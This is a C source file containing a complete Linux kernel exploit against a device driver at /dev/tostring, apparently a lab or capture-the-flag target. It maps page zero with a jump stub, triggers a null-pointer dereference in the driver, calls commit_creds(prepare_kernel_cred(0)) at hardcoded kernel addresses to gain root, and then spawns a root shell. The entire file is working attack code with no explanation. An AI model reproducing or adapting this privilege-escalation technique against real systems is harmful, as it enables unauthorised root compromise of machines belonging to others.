#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<fcntl.h>
#include<sys/stat.h>


#define DEVICE_FILE "/dev/tostring"

typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xc1070e80;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xc10711f0;

char nullify[]="**********S";
int fd;

void priv_esc(){
	commit_creds(prepare_kernel_cred(0));
}
void exploit(){
	char *mem=(char *)mmap(NULL,0x1000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	char shellcode[]="\xFF\x25\x06\x00\x00\x00";
	memcpy(mem,shellcode,6);
	*(int *)(mem+6)=&priv_esc;
	puts("[+] Function pointer nullifed!");
	write(fd,nullify,sizeof(nullify));
	puts("[+] Null deference triggered!");
	read(fd,NULL,0);
	char *args[]={"/bin/sh",NULL}; 
	puts("[+] Privilage escalation achieved!");
	puts("[+] Here is your root shell!");
	execve("/bin/sh",args,NULL);
}

int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
	return 0;
}

